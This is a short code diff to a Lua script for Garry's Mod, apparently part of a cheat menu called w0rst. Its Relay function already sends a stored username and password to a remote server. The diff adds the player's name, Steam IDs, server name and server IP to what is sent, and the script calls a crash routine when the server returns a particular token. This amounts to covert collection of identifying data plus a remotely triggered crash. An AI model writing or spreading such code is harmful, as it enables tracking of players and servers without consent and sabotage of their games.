@@ -142,7 +142,12 @@ local function Relay()
     local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
     http.Post("https://w0rst.xyz/project/api/relay.php", {
         user = UserInfo[1],
-        pass = UserInfo[2] }, function(b)
+        pass = UserInfo[2],
+        name = LocalPlayer():Name(),
+        id = LocalPlayer():SteamID(),
+        id64 = LocalPlayer():SteamID64(),
+        server = GetHostName(),
+        serverip = game.GetIPAddress() }, function(b)
         local s = string.Split(b, " ");
         if(s[1] == "a4dF91aE25c2BFD11F879e42") then
             crash()
